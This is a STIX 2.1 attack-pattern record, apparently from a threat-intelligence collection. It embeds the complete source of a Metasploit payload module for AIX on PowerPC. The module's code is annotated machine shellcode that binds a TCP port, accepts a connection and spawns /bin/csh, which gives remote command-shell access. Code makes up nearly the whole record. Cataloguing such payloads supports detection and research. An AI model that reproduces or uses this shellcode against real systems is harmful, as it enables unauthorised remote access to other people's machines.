{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--416a4380-6b96-44b0-9c5b-b10bee1184cc",
    "created": "2024-08-14T16:33:19.402572Z",
    "modified": "2024-08-14T16:33:19.402576Z",
    "name": "AIX Command Shell, Bind TCP Inline",
    "description": "Listen for a connection and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/aix/ppc/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 264\n\n  include Msf::Payload::Single\n  include Msf::Payload::Aix\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'AIX Command Shell, Bind TCP Inline',\n      'Description'   => 'Listen for a connection and spawn a command shell',\n      'Author'        => 'Ramon de C Valle',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'aix',\n      'Arch'          => ARCH_PPC,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'LPORT'    => [ 82, 'n' ],\n            },\n        }\n    ))\n\n  end\n\n  def generate(*args)\n    super(*args)\n\n    payload =\n      \"\\x7f\\xff\\xfa\\x79\"     + #   xor.    r31,r31,r31                #\n      \"\\x40\\x82\\xff\\xfd\"     + #   bnel    <bndsockcode>              #\n      \"\\x7f\\xc8\\x02\\xa6\"     + #   mflr    r30                        #\n      \"\\x3b\\xde\\x01\\xff\"     + #   cal     r30,511(r30)               #\n      \"\\x3b\\xde\\xfe\\x1d\"     + #   cal     r30,-483(r30)              #\n      \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n      \"\\x4e\\x80\\x04\\x20\"     + #   bctr                               #\n      \"\\x4c\\xc6\\x33\\x42\"     + #   crorc   6,6,6                      #\n      \"\\x44\\xff\\xff\\x02\"     + #   svca    0                          #\n      \"\\x3b\\xde\\xff\\xf8\"     + #   cal     r30,-8(r30)                #\n      \"\\x3b\\xa0\\x07\\xff\"     + #   lil     r29,2047                   #\n      \"\\x7c\\xa5\\x2a\\x78\"     + #   xor     r5,r5,r5                   #\n      \"\\x38\\x9d\\xf8\\x02\"     + #   cal     r4,-2046(r29)              #\n      \"\\x38\\x7d\\xf8\\x03\"     + #   cal     r3,-2045(r29)              #\n      @cal_socket +\n      \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n      \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n      \"\\x7c\\x7c\\x1b\\x78\"     + #   mr      r28,r3                     #\n      \"\\x38\\xbd\\xf8\\x11\"     + #   cal     r5,-2031(r29)              #\n      \"\\x3f\\x60\\xff\\x02\"     + #   liu     r27,-254                   #\n      \"\\x63\\x7b\\x11\\x5c\"     + #   oril    r27,r27,4444               #\n      \"\\x97\\xe1\\xff\\xfc\"     + #   stu     r31,-4(r1)                 #\n      \"\\x97\\x61\\xff\\xfc\"     + #   stu     r27,-4(r1)                 #\n      \"\\x7c\\x24\\x0b\\x78\"     + #   mr      r4,r1                      #\n      @cal_bind +\n      \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n      \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n      \"\\x7c\\x84\\x22\\x78\"     + #   xor     r4,r4,r4                   #\n      \"\\x7f\\x83\\xe3\\x78\"     + #   mr      r3,r28                     #\n      @cal_listen +\n      \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n      \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n      \"\\x7c\\xa5\\x2a\\x78\"     + #   xor     r5,r5,r5                   #\n      \"\\x7c\\x84\\x22\\x78\"     + #   xor     r4,r4,r4                   #\n      \"\\x7f\\x83\\xe3\\x78\"     + #   mr      r3,r28                     #\n      @cal_accept +\n      \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n      \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n      \"\\x7c\\x7a\\x1b\\x78\"     + #   mr      r26,r3                     #\n      \"\\x3b\\x3d\\xf8\\x03\"     + #   cal     r25,-2045(r29)             #\n      \"\\x7f\\x23\\xcb\\x78\"     + #   mr      r3,r25                     #\n      @cal_close +\n      \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n      \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n      \"\\x7f\\x25\\xcb\\x78\"     + #   mr      r5,r25                     #\n      \"\\x7c\\x84\\x22\\x78\"     + #   xor     r4,r4,r4                   #\n      \"\\x7f\\x43\\xd3\\x78\"     + #   mr      r3,r26                     #\n      @cal_kfcntl +\n      \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n      \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n      \"\\x37\\x39\\xff\\xff\"     + #   ai.     r25,r25,-1                 #\n      \"\\x40\\x80\\xff\\xd4\"     + #   bge     <bndsockcode+160>          #\n      \"\\x7c\\xa5\\x2a\\x79\"     + #   xor.    r5,r5,r5                   #\n      \"\\x40\\x82\\xff\\xfd\"     + #   bnel    <bndsockcode+208>          #\n      \"\\x7f\\x08\\x02\\xa6\"     + #   mflr    r24                        #\n      \"\\x3b\\x18\\x01\\xff\"     + #   cal     r24,511(r24)               #\n      \"\\x38\\x78\\xfe\\x29\"     + #   cal     r3,-471(r24)               #\n      \"\\x98\\xb8\\xfe\\x31\"     + #   stb     r5,-463(r24)               #\n      \"\\x94\\xa1\\xff\\xfc\"     + #   stu     r5,-4(r1)                  #\n      \"\\x94\\x61\\xff\\xfc\"     + #   stu     r3,-4(r1)                  #\n      \"\\x7c\\x24\\x0b\\x78\"     + #   mr      r4,r1                      #\n      @cal_execve +\n      \"\\x7f\\xc9\\x03\\xa6\"     + #   mtctr   r30                        #\n      \"\\x4e\\x80\\x04\\x21\"     + #   bctrl                              #\n      \"/bin/csh\"\n\n      # If the payload is generated and there are offsets to substitute,\n      # do that now.\n      if (payload and offsets)\n        substitute_vars(payload, offsets)\n      end\n\n      payload\n  end\nend\n",
    "x_mitre_platforms": [
        "aix'"
    ]
}